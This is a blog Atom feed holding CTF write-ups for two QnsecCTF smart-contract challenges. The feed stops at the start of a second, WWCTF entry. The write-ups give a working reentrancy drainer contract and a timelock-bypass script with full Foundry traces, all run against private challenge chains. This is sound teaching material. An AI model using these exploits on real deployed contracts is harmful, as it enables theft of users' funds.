<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://block-programr.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://block-programr.github.io/" rel="alternate" type="text/html" /><updated>2025-10-22T19:06:08+00:00</updated><id>https://block-programr.github.io/feed.xml</id><title type="html">5C4T3R - Smart Contract Security Engineer</title><subtitle>Smart Contract CTF Writeups, Exploits, and Security Research(Blockchain, Solidity, EVM, Ethereum, Audits, Vulnerabilities, and more))</subtitle><entry><title type="html">Qnsec Blockchain Challenges</title><link href="https://block-programr.github.io/writeups/2025/10/19/QnsecCTF.html" rel="alternate" type="text/html" title="Qnsec Blockchain Challenges" /><published>2025-10-19T00:00:00+00:00</published><updated>2025-10-19T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/10/19/QnsecCTF</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/10/19/QnsecCTF.html"><![CDATA[<p>I recently participated in QnsecCTF with my team, <strong>HackerTroupe</strong>. As usual, I solved the smart contract challenges.</p>

<h3 id="challenge-1">Challenge 1:</h3>

<p><strong>Description</strong>:
They provided two contracts:</p>

<p><strong>Challenge.sol</strong>:</p>
<pre><code class="language-solidity">// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "src/CallMeBack.sol";

contract Challenge {
    address public immutable PLAYER;
    CallMeBack public immutable CONTRACT;

    bool private solved;

    constructor(address player, address _contract) public {
        PLAYER = player;
        
        CONTRACT = CallMeBack(payable(_contract));
    }

    function solve() external {
        require(address(PLAYER).balance &gt; 10 ether, "NOT_ENOUGH_ETHER");
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}

</code></pre>
<p><strong>CallmeBack.sol</strong>:</p>
<pre><code class="language-solidity">// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract CallMeBack {

    mapping(address =&gt; uint256) public balances;

    function donate() public payable {
        balances[msg.sender] += msg.value;
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] &gt;= _amount) {
            (bool success,) = msg.sender.call{value: _amount}("");
            require(success, "ETH transfer failed");
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
</code></pre>

<p>Also, they provided nc 161.97.155.116 6969 port which is used to get a private blockchain to solve the challenge.</p>

<p><strong>Analysis</strong>:
This is a classic reentrancy attack because of checks-effects-interaction violation. If you call outside contracts, first update the value then call the function, otherwise it causes reentrancy!</p>

<p><strong>Steps to solve</strong>:</p>

<ul>
  <li>Connect to the port and deploy the blockchain:</li>
</ul>

<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ nc 161.97.155.116 6969

# Press 1

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[callmeback] A random degen has appeared!
[callmeback] 1 - Launch a new instance
[callmeback] 2 - Kill your instance
[callmeback] 3 - Get the flag
[callmeback] Action? 1

[callmeback] Your ticket: aa40f1a9f367bc64268139a2614ada39

[callmeback] Creating private blockchain...
[callmeback] Deploying challenge.. (please be patient, this can take a while)

[callmeback] Your private blockchain has been set up,
[callmeback] it will automatically terminate in 15.0 minutes!

[callmeback] RPC Endpoints:
[callmeback]     - http://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main
[callmeback]     - ws://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main/ws

[callmeback] The Player private key:         0x665a52bbf260dfab3abdef5d5f4a0892b2d5eddc3d9bd56470b831e25b40d8a0
[callmeback] The Challenge contract address: 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A

</code></pre>

<ul>
  <li>Get the CallMeBack contract address. It is stored onchain, you can get it by using foundry commands:</li>
</ul>

<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ source .env

# Get CallMeBack address
CALLMEBACK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)
echo "CallMeBack: $CALLMEBACK"

# Add to .env
echo "export CALLMEBACK=\"$CALLMEBACK\"" &gt;&gt; .env
source .env
</code></pre>

<p>Output:</p>
<pre><code class="language-Bash">CallMeBack: 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2
</code></pre>

<p>Then you can see the .env file:</p>

<pre><code class="language-Bash">export RPC_URL="http://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main"
export PRIVATE_KEY="0x665a52bbf260dfab3abdef5d5f4a0892b2d5eddc3d9bd56470b831e25b40d8a0"
export CHALLENGE="0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A"
export CALLMEBACK="0xb3CEA24519bcF7da2859A864a624428D1dCF7af2"

</code></pre>
<p>After that, check the CallMeBack balance, then go for the exploit:</p>

<pre><code class="language-Bash"># Check CallMeBack balance
cast balance $CALLMEBACK --rpc-url $RPC_URL --ether

# Check Player address
PLAYER=$(cast wallet address --private-key $PRIVATE_KEY)
echo "Player: $PLAYER"

# Check Player balance
cast balance $PLAYER --rpc-url $RPC_URL --ether
</code></pre>

<p>Output:</p>
<pre><code class="language-Bash">1.000000000000000000
Player: 0xd201156e618Bcd1874dCFb01Eebe652b05C87252
10.000000000000000000
</code></pre>

<ul>
  <li>Now write <code class="language-plaintext highlighter-rouge">src/Exploit.sol</code> to exploit the CallMeBack contract:</li>
</ul>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ICallMeBack {
    function donate() external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract Exploit {
    ICallMeBack public target;
    uint256 public amount;
    
    constructor(address _target) public {
        target = ICallMeBack(_target);
    }
    
    function attack() external payable {
        require(msg.value &gt;= 1 ether, "Need at least 1 ETH");
        amount = msg.value;
        
        target.donate{value: amount}();
        target.withdraw(amount);
    }
    
    receive() external payable {
        if (address(target).balance &gt;= amount) {
            target.withdraw(amount);
        }
    }
    
    function withdraw() external {
        msg.sender.transfer(address(this).balance);
    }
}
</code></pre>

<ul>
  <li>This is the script contract (<code class="language-plaintext highlighter-rouge">script/Solve.s.sol</code>) to attack the CallMeBack.sol:</li>
</ul>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../src/Exploit.sol";

contract SolveScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address callMeBack = vm.envAddress("CALLMEBACK");
        address challenge = vm.envAddress("CHALLENGE");
        
        vm.startBroadcast(deployerPrivateKey);
        
        // Deploy exploit
        Exploit exploit = new Exploit(callMeBack);
        console.log("Exploit deployed at:", address(exploit));
        
        // Attack with 1 ETH
        exploit.attack{value: 1 ether}();
        console.log("Attack executed");
        
        // Withdraw stolen funds
        exploit.withdraw();
        console.log("Funds withdrawn to player");
        
        // Call solve
        (bool success,) = challenge.call(abi.encodeWithSignature("solve()"));
        require(success, "Solve failed");
        console.log("Challenge solved!");
        
        vm.stopBroadcast();
    }
}
</code></pre>

<ul>
  <li>Now run this command to understand how the attack works:
    <pre><code class="language-Bash">forge script script/Solve.s.sol:SolveScript \
--rpc-url $RPC_URL \
--broadcast \
--legacy \
-vvvv
</code></pre>
  </li>
  <li>Result:</li>
</ul>

<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ forge script script/Solve.s.sol:SolveScript \
  --rpc-url $RPC_URL \
  --broadcast \
  --legacy \
  -vvvv
[⠆] Compiling...
No files changed, compilation skipped
Traces:
  [397516] SolveScript::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] &lt;env var value&gt;
    ├─ [0] VM::envAddress("CALLMEBACK") [staticcall]
    │   └─ ← [Return] &lt;env var value&gt;
    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
    │   └─ ← [Return] &lt;env var value&gt;
    ├─ [0] VM::startBroadcast(&lt;pk&gt;)
    │   └─ ← [Return]
    ├─ [222929] → new Exploit@0xD9f928f593C059A6849731E5e86443aEeBaA1375
    │   └─ ← [Return] 1002 bytes of code
    ├─ [0] console::log("Exploit deployed at:", Exploit: [0xD9f928f593C059A6849731E5e86443aEeBaA1375]) [staticcall]
    │   └─ ← [Stop]
    ├─ [91752] Exploit::attack{value: 1000000000000000000}()
    │   ├─ [22385] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::donate{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   ├─ [36735] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
    │   │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
    │   │   │   ├─ [8116] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
    │   │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] console::log("Attack executed") [staticcall]
    │   └─ ← [Stop]
    ├─ [7027] Exploit::withdraw()
    │   ├─ [0] 0xd201156e618Bcd1874dCFb01Eebe652b05C87252::fallback{value: 2000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] console::log("Funds withdrawn to player") [staticcall]
    │   └─ ← [Stop]
    ├─ [22462] 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A::solve()
    │   └─ ← [Stop]
    ├─ [0] console::log("Challenge solved!") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

== Logs ==
  Exploit deployed at: 0xD9f928f593C059A6849731E5e86443aEeBaA1375
  Attack executed
  Funds withdrawn to player
  Challenge solved!

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [222929] → new Exploit@0xD9f928f593C059A6849731E5e86443aEeBaA1375
    └─ ← [Return] 1002 bytes of code

  [93752] Exploit::attack{value: 1000000000000000000}()
    ├─ [22385] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::donate{value: 1000000000000000000}()
    │   └─ ← [Stop]
    ├─ [36735] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
    │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
    │   │   ├─ [8116] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
    │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    └─ ← [Stop]

  [7027] Exploit::withdraw()
    ├─ [0] 0xd201156e618Bcd1874dCFb01Eebe652b05C87252::fallback{value: 2000000000000000000}()
    │   └─ ← [Stop]
    └─ ← [Stop]

  [22462] 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A::solve()
    └─ ← [Stop]


==========================

Chain 31337

Estimated gas price: 1.673006184 gwei

Estimated total gas used for script: 614085

Estimated amount required: 0.00102736800250164 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0xc7198436788802fdc90d36591ff72bb08ce2ae40009a419334dbe6e52646bb61
Block: 5
Paid: 0.000046996416714744 ETH (28091 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x887a15a5c7969d0899f1b0b33e78519d3b7f55abd82a179264c64f2031261fa2
Contract Address: 0xD9f928f593C059A6849731E5e86443aEeBaA1375
Block: 4
Paid: 0.000491326783110936 ETH (293679 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x5d0f61180b0d89298b0d070495c32d48ac94b01c1f4f56bcf14307199eb22f18
Block: 5
Paid: 0.000158795054960544 ETH (94916 gas * 1.673006184 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0xe0b77ffe40b48c3dd8d5f4cf7c5d604ce09391a34a523e021dc569e01969234b
Block: 6
Paid: 0.000072819267164784 ETH (43526 gas * 1.673006184 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000769937521951008 ETH (460212 gas * avg 1.673006184 gwei)
                                                                                              

==========================

ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.

Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/broadcast/Solve.s.sol/31337/run-latest.json

Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/cache/Solve.s.sol/31337/run-latest.json
</code></pre>
<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ # Check if solved
cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL

# Should return: true
true     

### Challenge successfully completed!
</code></pre>

<ul>
  <li>To get Flag:</li>
</ul>

<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ nc 161.97.155.116 6969

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[callmeback] You dare challenge me?
[callmeback] 1 - Launch a new instance
[callmeback] 2 - Kill your instance
[callmeback] 3 - Get the flag
[callmeback] Action? 3

[callmeback] What is your ticket? aa40f1a9f367bc64268139a2614ada39
[callmeback] Congratulations! Here is your flag: QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}
</code></pre>

<h4 id="challenge-2">Challenge 2:</h4>

<p><strong>Description</strong>:
This is a very simple challenge. It’s a basic ERC20 mechanism to exploit the contract.
They provided two contracts:
<strong>Challenge.sol</strong>:</p>
<pre><code class="language-solidity">// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/Timelock.sol";

contract Challenge {
    address public immutable PLAYER;
    Timelock public immutable CONTRACT;

    bool private solved;

    constructor(address player, address _contract) public {
        PLAYER = player;
        
        CONTRACT = Timelock(payable(_contract));
    }

    function solve() external {
        require(CONTRACT.balanceOf(PLAYER) == 0, "COINS_NOT_SPENT");
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}

</code></pre>
<p><strong>TimeLock.sol</strong>:</p>
<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Timelock is ERC20 {
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        _mint(player, INITIAL_SUPPLY);
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp &gt; timeLock);
            _;
        }
    }
}
</code></pre>

<p><strong>Analysis</strong>:
After understanding these two contracts, this is a very basic challenge to exploit. In ERC20, you can actually transfer tokens using the <code class="language-plaintext highlighter-rouge">transferFrom</code> function. Before this, you just approve tokens. If you approve them, you can get the tokens anytime. But here, you can only get the tokens after a certain time period passes. This is the core fault—you can bypass it using <code class="language-plaintext highlighter-rouge">transferFrom</code> and <code class="language-plaintext highlighter-rouge">approve</code> in ERC20 tokens.</p>

<h4 id="steps-to-solve">Steps to solve:</h4>

<ul>
  <li>Use nc 161.97.155.116 6970 to get the private blockchain:</li>
</ul>

<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ nc 161.97.155.116 6970
# Press 1

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[timelock] Welcome anon!
[timelock] 1 - Launch a new instance
[timelock] 2 - Kill your instance
[timelock] 3 - Get the flag
[timelock] Action? 1

[timelock] Your ticket: 5e1412cd7083b4b49f31098c9b322b16

[timelock] Creating private blockchain...
[timelock] Deploying challenge.. (please be patient, this can take a while)

[timelock] Your private blockchain has been set up,
[timelock] it will automatically terminate in 15.0 minutes!

[timelock] RPC Endpoints:
[timelock]     - http://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main
[timelock]     - ws://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main/ws

[timelock] The Player private key:         0xaabd6bc6c80b62c8e486de2285d9f7a9d59995694a73ed98481e51f0e0016414
[timelock] The Challenge contract address: 0xf00F7a89E5da858edB45744e4464E468897c1e1e
</code></pre>

<ul>
  <li>After that, find the Timelock contract address which is stored onchain. You can get the address by using foundry cast command:</li>
</ul>

<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cd ~/SCATERLABs/CTFs/Block1/bloc2
source .env

TIMELOCK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)
echo "export TIMELOCK=\"$TIMELOCK\"" &gt;&gt; .env
source .env
</code></pre>

<p>After that, the .env file looks like:</p>

<pre><code class="language-Bash">export RPC_URL="http://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main"
export PRIVATE_KEY="0xaabd6bc6c80b62c8e486de2285d9f7a9d59995694a73ed98481e51f0e0016414"
export CHALLENGE="0xf00F7a89E5da858edB45744e4464E468897c1e1e"
export TIMELOCK="0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6"
</code></pre>

<ul>
  <li>Now write the script file directly to exploit this:</li>
</ul>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Timelock.sol";
import "../src/Challenge.sol";

contract SolveScript is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address timelock = vm.envAddress("TIMELOCK");
        address challenge = vm.envAddress("CHALLENGE");
        
        vm.startBroadcast(deployerPrivateKey);
        
        Timelock token = Timelock(timelock);
        address player = vm.addr(deployerPrivateKey);
        
        uint256 balance = token.balanceOf(player);
        console.log("Player balance:", balance);
        
        // Step 1: Approve ourselves to spend our own tokens
        token.approve(player, balance);
        console.log("Approved:", balance);
        
        // Step 2: Use transferFrom to bypass the timelock
        // Transfer to any address (we'll use address(1) as burn)
        token.transferFrom(player, address(0x1), balance);
        console.log("Transferred via transferFrom!");
        
        // Step 3: Verify balance is 0
        uint256 newBalance = token.balanceOf(player);
        console.log("New balance:", newBalance);
        
        // Step 4: Call solve
        Challenge(challenge).solve();
        console.log("Challenge solved!");
        
        vm.stopBroadcast();
    }
}
</code></pre>

<ul>
  <li>Run the command:</li>
</ul>

<pre><code class="language-Bash">   nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
</code></pre>

<ul>
  <li>Result Logs:</li>
</ul>

<pre><code class="language-Bash"> nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ source .env
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
[⠒] Compiling...
No files changed, compilation skipped
Traces:
  [104448] SolveScript::run()
    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] &lt;env var value&gt;
    ├─ [0] VM::envAddress("TIMELOCK") [staticcall]
    │   └─ ← [Return] &lt;env var value&gt;
    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
    │   └─ ← [Return] &lt;env var value&gt;
    ├─ [0] VM::startBroadcast(&lt;pk&gt;)
    │   └─ ← [Return]
    ├─ [0] VM::addr(&lt;pk&gt;) [staticcall]
    │   └─ ← [Return] 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732
    ├─ [2850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000 [1e24]
    ├─ [0] console::log("Player balance:", 1000000000000000000000000 [1e24]) [staticcall]
    │   └─ ← [Stop]
    ├─ [25296] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::approve(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, 1000000000000000000000000 [1e24])
    │   ├─ emit Approval(owner: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, spender: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, value: 1000000000000000000000000 [1e24])
    │   └─ ← [Return] true
    ├─ [0] console::log("Approved:", 1000000000000000000000000 [1e24]) [staticcall]
    │   └─ ← [Stop]
    ├─ [29614] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::transferFrom(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000000000 [1e24])
    │   ├─ emit Transfer(from: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000000000000000000000000 [1e24])
    │   └─ ← [Return] true
    ├─ [0] console::log("Transferred via transferFrom!") [staticcall]
    │   └─ ← [Stop]
    ├─ [850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("New balance:", 0) [staticcall]
    │   └─ ← [Stop]
    ├─ [23895] 0xf00F7a89E5da858edB45744e4464E468897c1e1e::solve()
    │   ├─ [850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [0] console::log("Challenge solved!") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return]
    └─ ← [Stop]


Script ran successfully.

== Logs ==
  Player balance: 1000000000000000000000000
  Approved: 1000000000000000000000000
  Transferred via transferFrom!
  New balance: 0
  Challenge solved!

## Setting up 1 EVM.
==========================
Simulated On-chain Traces:

  [25296] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::approve(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, 1000000000000000000000000 [1e24])
    ├─ emit Approval(owner: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, spender: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, value: 1000000000000000000000000 [1e24])
    └─ ← [Return] true

  [36414] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::transferFrom(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000000000 [1e24])
    ├─ emit Transfer(from: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000000000000000000000000 [1e24])
    └─ ← [Return] true

  [28395] 0xf00F7a89E5da858edB45744e4464E468897c1e1e::solve()
    ├─ [2850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
    │   └─ ← [Return] 0
    └─ ← [Stop]


==========================

Chain 31337

Estimated gas price: 1.7756804 gwei

Estimated total gas used for script: 204292

Estimated amount required: 0.0003627573002768 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0x29230c2b2ecaa6c50f10dd9cf7bf011041a3ef6dd6e07709efecabab33aa96bd
Block: 3
Paid: 0.000083350437976 ETH (46940 gas * 1.7756804 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x732a8a01c8f4eeb5ecba94790f10049b4fbc4dacf0e7e4f081281101f35a2697
Block: 4
Paid: 0.0000878233769036 ETH (49459 gas * 1.7756804 gwei)


##### anvil-hardhat
✅  [Success] Hash: 0x3a344d2618f955b3c12bb1e4796bb5deaaf42168e119faaeecaacdf59bdc503d
Block: 4
Paid: 0.0000862945160792 ETH (48598 gas * 1.7756804 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.0002574683309588 ETH (144997 gas * avg 1.7756804 gwei)
                                                                 

==========================

ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.

Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc2/broadcast/Solve.s.sol/31337/run-latest.json

Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc2/cache/Solve.s.sol/31337/run-latest.json

nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
[⠊] Compiling...
No files changed, compilation skipped
^C
nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL
true ## true means the challenge is solved!
</code></pre>

<ul>
  <li>To get Flag:</li>
</ul>

<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ nc 161.97.155.116 6970

 ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
 ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     

[timelock] Welcome anon!
[timelock] 1 - Launch a new instance
[timelock] 2 - Kill your instance
[timelock] 3 - Get the flag
[timelock] Action? 3

[timelock] What is your ticket? 5e1412cd7083b4b49f31098c9b322b16
[timelock] Nicely done! Now don't lose it: QnQSec{gr3at_j0b_y0u_l3arn7_4b0u7_3rc20_t0k3n5}

</code></pre>]]></content><author><name></name></author><category term="writeups" /><category term="ctfs" /><category term="blockchain" /><summary type="html"><![CDATA[I recently participated in QnsecCTF with my team, HackerTroupe. As usual, I solved the smart contract challenges.]]></summary></entry><entry><title type="html">WWCTF Blockchain Challenges</title><link href="https://block-programr.github.io/writeups/2025/07/27/WWCTF.html" rel="alternate" type="text/html" title="WWCTF Blockchain Challenges" /><published>2025-07-27T00:00:00+00:00</published><updated>2025-07-27T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/07/27/WWCTF</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/07/27/WWCTF.html"><![CDATA[<p>I recently participated in WWCTF with my team, <strong>HackerTroupe</strong>. As usual, I solved the smart contract challenges.</p>

<h3 id="challenge-1">Challenge 1:</h3>

<p>This is my solution for the “Jail Challenge 1” blockchain challenge.</p>

<p>The objective is to retrieve the <code class="language-plaintext highlighter-rouge">flag</code> variable from a <code class="language-plaintext highlighter-rouge">BytecodeRunner</code> contract, but our input is restricted by a Solidity keyword jail.</p>

<h3 id="challenge-analysis">Challenge Analysis</h3>

<p>The challenge provides two files that define the environment.</p>

<h4 id="the-jailer-contract-jailsol">The Jailer Contract (<code class="language-plaintext highlighter-rouge">Jail.sol</code>)</h4>

